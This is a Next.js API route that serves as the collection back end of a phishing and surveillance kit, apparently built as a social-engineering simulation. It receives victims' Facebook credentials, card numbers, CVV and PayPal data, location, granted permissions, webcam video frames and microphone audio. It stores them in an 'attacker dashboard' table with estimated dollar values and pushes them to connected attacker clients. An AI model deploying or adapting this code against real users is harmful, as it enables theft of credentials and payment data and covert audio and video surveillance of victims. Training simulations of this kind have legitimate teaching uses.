import { NextRequest, NextResponse } from 'next/server'
import { supabase } from '@/lib/supabase'

const MAIN_APP_URL = process.env.NEXT_PUBLIC_MAIN_APP_URL || 'http://localhost:3000'

// Store active SSE connections
const clients = new Map<string, WritableStreamDefaultWriter>()

// Handle CORS preflight requests
export async function OPTIONS(request: NextRequest) {
  return new NextResponse(null, {
    status: 200,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    },
  })
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { type, data, sessionId } = body
    
    console.log('📨 Received data:', { type, data, sessionId })
    
    // Store in database
    switch (type) {
      case 'click':
        await supabase.from('click_events').insert({
          session_id: sessionId,
          scenario_type: 'social',
          click_coordinates: `${data.x},${data.y}`,
          target_element: 'malicious',
          was_successful_attack: true,
        })
        
        // Broadcast to all connected clients
        broadcastToClients({
          type: 'click_captured',
          x: data.x,
          y: data.y,
          sessionId,
        })
        break
        
      case 'credentials':
        console.log('💳 CREDENTIAL received:', data.field, '=', data.value)
        await supabase.from('captured_credentials').insert({
          session_id: sessionId,
          scenario_id: 'social_media',
          field_name: data.field,
          captured_value: data.value,
        })
        
        // Broadcast credential capture
        broadcastToClients({
          type: 'credentials_captured',
          field: data.field,
          sessionId,
        })
        
        // Store in attacker view with proper field mapping
        let dataType = data.field
        let capturedData: any = {}
        let estimatedValue = 25
        
        // Handle different credential types
        if (data.field.includes('facebook')) {
          dataType = 'facebook'
          // Use the actual field name as the key
          capturedData = { [data.field]: data.value }
          estimatedValue = data.field.includes('password') ? 50 : 25
          
          // Check if Facebook record exists for this session
          const { data: existing, error: selectError } = await supabase
            .from('attacker_dashboard_view')
            .select('*')
            .eq('victim_session', sessionId)
            .eq('data_type', 'facebook')
            .maybeSingle()
          
          if (existing) {
            // PROPERLY merge new data with existing data - preserve ALL existing fields
            const existingData = existing.captured_data || {}
            // Create new data object with the specific field
            const newFieldData = { [data.field]: data.value }
            const mergedData = { ...existingData, ...newFieldData }
            
            console.log('🔄 Found existing record:', existing.entry_id)
            console.log('📊 OLD data:', existingData)
            console.log('📊 NEW field data:', newFieldData)
            console.log('📊 MERGED data:', mergedData)
            
            // Since UPDATE policy might be missing, delete and re-insert
            const { error: deleteError } = await supabase
              .from('attacker_dashboard_view')
              .delete()
              .eq('entry_id', existing.entry_id)
              
            if (deleteError) {
              console.error('❌ Delete error:', deleteError)
              // If delete fails, try update anyway
              const { data: updateData, error: updateError } = await supabase
                .from('attacker_dashboard_view')
                .update({
                  captured_data: mergedData,
                  captured_at: new Date().toISOString()
                })
                .eq('entry_id', existing.entry_id)
                .select()
                
              if (updateError) {
                console.error('❌ Update error:', updateError)
              } else {
                console.log('✅ Successfully updated record')
                console.log('📊 Updated data:', updateData)
              }
            } else {
              console.log('✅ Deleted old record, inserting new one...')
              // Re-insert with merged data
              const { error: insertError } = await supabase.from('attacker_dashboard_view').insert({
                victim_session: sessionId,
                data_type: 'facebook',
                captured_data: mergedData,
                estimated_value_usd: data.field.includes('password') ? 75 : 50,
              })
              
              if (insertError) {
                console.error('❌ Re-insert error:', insertError)
              } else {
                console.log('✅ Successfully re-inserted record with merged data')
              }
            }
          } else {
            // Create new record
            console.log('🆕 Creating new record for session:', sessionId)
            console.log('📊 Initial data:', capturedData)
            const { error: insertError } = await supabase.from('attacker_dashboard_view').insert({
              victim_session: sessionId,
              data_type: 'facebook',
              captured_data: capturedData,
              estimated_value_usd: estimatedValue,
            })
            
            if (insertError) {
              console.error('❌ Insert error:', insertError)
            } else {
              console.log('✅ Successfully created new record')
            }
          }
        } else if (data.field.includes('card') || data.field === 'cvv' || data.field.includes('expiry') || data.field.includes('paypal')) {
          console.log('🏦 BANKING field detected:', data.field, '=', data.value)
          dataType = 'banking'
          capturedData = { [data.field]: data.value }
          estimatedValue = 75
          
          // Check if banking record exists for this session
          const { data: existing, error: selectError } = await supabase
            .from('attacker_dashboard_view')
            .select('*')
            .eq('victim_session', sessionId)
            .eq('data_type', 'banking')
            .maybeSingle()
            
          if (existing) {
            // Merge with existing data
            const existingData = existing.captured_data || {}
            const newFieldData = { [data.field]: data.value }
            const mergedData = { ...existingData, ...newFieldData }
            
            console.log('🔄 Found existing banking record:', existing.entry_id)
            console.log('📊 OLD banking data:', existingData)
            console.log('📊 NEW field data:', newFieldData)
            console.log('📊 MERGED banking data:', mergedData)
            
            // Try UPDATE first (preferred method)
            const { data: updateData, error: updateError } = await supabase
              .from('attacker_dashboard_view')
              .update({
                captured_data: mergedData,
                captured_at: new Date().toISOString()
              })
              .eq('entry_id', existing.entry_id)
              .select()
              
            if (updateError) {
              console.error('❌ Banking UPDATE error (RLS policy issue):', updateError)
              // Fallback: Try delete and re-insert
              const { error: deleteError } = await supabase
                .from('attacker_dashboard_view')
                .delete()
                .eq('entry_id', existing.entry_id)
                
              if (!deleteError) {
                console.log('✅ Deleted old banking record, inserting new one...')
                const { error: insertError } = await supabase.from('attacker_dashboard_view').insert({
                  victim_session: sessionId,
                  data_type: 'banking',
                  captured_data: mergedData,
                  estimated_value_usd: 75,
                })
                
                if (insertError) {
                  console.error('❌ Banking re-insert error:', insertError)
                } else {
                  console.log('✅ Successfully re-inserted banking record with merged data')
                }
              } else {
                console.error('❌ Banking DELETE error (RLS policy issue):', deleteError)
                console.log('⚠️ Creating new banking record as fallback (will create duplicates)')
                // Last resort: create new record (will create duplicates but data won't be lost)
                await supabase.from('attacker_dashboard_view').insert({
                  victim_session: sessionId,
                  data_type: 'banking',
                  captured_data: capturedData,
                  estimated_value_usd: estimatedValue,
                })
              }
            } else {
              console.log('✅ Successfully updated banking record')
              console.log('📊 Updated banking data:', updateData)
            }
          } else {
            // Create new record
            console.log('🆕 Creating new banking record for session:', sessionId)
            console.log('📊 Initial banking data:', capturedData)
            const { error: insertError } = await supabase.from('attacker_dashboard_view').insert({
              victim_session: sessionId,
              data_type: 'banking',
              captured_data: capturedData,
              estimated_value_usd: estimatedValue,
            })
            
            if (insertError) {
              console.error('❌ Banking insert error:', insertError)
            } else {
              console.log('✅ Successfully created new banking record')
            }
          }
        } else if (data.field === 'permissions_granted' || data.field === 'location_captured' || data.field === 'media_hijacked') {
          console.log('🔓 PERMISSIONS field detected:', data.field, '=', data.value)
          dataType = 'permissions'
          capturedData = { [data.field]: data.value }
          estimatedValue = 100 // High value for permissions
          
          // Check if permissions record exists for this session
          const { data: existing, error: selectError } = await supabase
            .from('attacker_dashboard_view')
            .select('*')
            .eq('victim_session', sessionId)
            .eq('data_type', 'permissions')
            .maybeSingle()
            
          if (existing) {
            // Merge with existing data
            const existingData = existing.captured_data || {}
            const newFieldData = { [data.field]: data.value }
            const mergedData = { ...existingData, ...newFieldData }
            
            // Try UPDATE first
            const { data: updateData, error: updateError } = await supabase
              .from('attacker_dashboard_view')
              .update({
                captured_data: mergedData,
                captured_at: new Date().toISOString()
              })
              .eq('entry_id', existing.entry_id)
              .select()
              
            if (updateError) {
              console.error('❌ Permissions UPDATE error:', updateError)
              // Fallback: create new record
              await supabase.from('attacker_dashboard_view').insert({
                victim_session: sessionId,
                data_type: 'permissions',
                captured_data: capturedData,
                estimated_value_usd: estimatedValue,
              })
            } else {
              console.log('✅ Successfully updated permissions record')
            }
          } else {
            // Create new record
            console.log('🆕 Creating new permissions record for session:', sessionId)
            await supabase.from('attacker_dashboard_view').insert({
              victim_session: sessionId,
              data_type: 'permissions',
              captured_data: capturedData,
              estimated_value_usd: estimatedValue,
            })
          }
        } else {
          capturedData[data.field] = data.value
          
          await supabase.from('attacker_dashboard_view').insert({
            victim_session: sessionId,
            data_type: dataType,
            captured_data: capturedData,
            estimated_value_usd: estimatedValue,
          })
        }
        break
        
      case 'victim_connected':
        // Broadcast new victim
        broadcastToClients({
          type: 'victim_connected',
          ip: data.ip || 'Unknown',
          sessionId,
        })
        break
        
      case 'video_frame':
        console.log('📹 VIDEO FRAME received from session:', sessionId)
        
        // Store latest video frame with hasVideo/hasAudio flags
        await supabase.from('attacker_dashboard_view').insert({
          victim_session: sessionId,
          data_type: 'video_surveillance',
          captured_data: {
            frame: data.frame,
            timestamp: data.timestamp,
            hasVideo: data.hasVideo || true,
            hasAudio: data.hasAudio || false
          },
          estimated_value_usd: 150,
        })
        
        // Broadcast video frame
        broadcastToClients({
          type: 'video_frame',
          sessionId,
          frame: data.frame,
          timestamp: data.timestamp,
          hasVideo: data.hasVideo,
          hasAudio: data.hasAudio
        })
        break
        
      case 'audio_capture':
        console.log('🎤 AUDIO CAPTURE received from session:', sessionId)
        
        // Store audio capture data
        await supabase.from('attacker_dashboard_view').insert({
          victim_session: sessionId,
          data_type: 'audio_surveillance',
          captured_data: {
            audio: data.audio,
            timestamp: data.timestamp,
            duration: data.duration
          },
          estimated_value_usd: 100,
        })
        
        // Broadcast audio capture
        broadcastToClients({
          type: 'audio_capture',
          sessionId,
          audio: data.audio,
          timestamp: data.timestamp,
          duration: data.duration
        })
        break
        
      case 'stream_ready':
        console.log('📡 STREAM READY from session:', sessionId)
        
        // Store stream readiness
        await supabase.from('attacker_dashboard_view').insert({
          victim_session: sessionId,
          data_type: 'stream_ready',
          captured_data: {
            hasVideo: data.hasVideo,
            hasAudio: data.hasAudio,
            timestamp: new Date().toISOString()
          },
          estimated_value_usd: 200,
        })
        break
        
      case 'webrtc_signal':
        console.log('📶 WebRTC SIGNAL:', data.type)
        
        // Store WebRTC signaling data  
        const signalData: any = {
          signal_type: data.type,
          timestamp: new Date().toISOString()
        }
        
        if (data.offer) signalData.offer = data.offer
        if (data.answer) signalData.answer = data.answer  
        if (data.candidate) signalData.candidate = data.candidate
        
        await supabase.from('attacker_dashboard_view').insert({
          victim_session: sessionId,
          data_type: 'webrtc_signal',
          captured_data: signalData,
          estimated_value_usd: 0,
        })
        break
    }
    
    return NextResponse.json({ success: true }, {
      headers: {
        'Access-Control-Allow-Origin': MAIN_APP_URL,
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization',
      }
    })
  } catch (error) {
    console.error('Capture error:', error)
    return NextResponse.json({ error: 'Failed to capture data' }, { 
      status: 500,
      headers: {
        'Access-Control-Allow-Origin': MAIN_APP_URL,
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization',
      }
    })
  }
}

function broadcastToClients(data: any) {
  // Use the global event store
  const eventStore = (global as any).eventStore
  if (eventStore) {
    eventStore.addEvent(data)
  }
}